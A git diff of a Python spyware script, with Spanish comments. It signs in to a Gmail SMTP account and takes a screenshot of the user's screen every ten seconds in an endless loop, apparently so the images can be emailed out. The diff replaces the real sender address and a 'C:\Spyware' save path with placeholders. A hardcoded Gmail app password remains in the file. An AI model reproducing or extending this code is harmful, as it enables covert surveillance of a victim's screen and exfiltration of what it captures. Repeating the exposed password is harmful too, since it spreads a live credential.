@@ -2,7 +2,7 @@ from email.mime.application import MIMEApplication
 
 smtp_server = 'smtp.gmail.com'
 smtp_port = 587
-smtp_username = 'pruebashack2002@gmail.com'
+smtp_username = 'Correo'
 smtp_password = 'eenmwsuoiyxluzyq'
 to = 'recipient_email@example.com'
 
@@ -11,7 +11,7 @@ while True:
     screenshot = pyautogui.screenshot()
 
     # Guarda la captura de pantalla en una ubicación específica
-    screenshot.save('C:\Spyware\captura_de_pantalla.png')
+    screenshot.save('Donde se va a almacenar')
 
     # Espera 10 segundos antes de tomar otra captura de pantalla
     time.sleep(10)
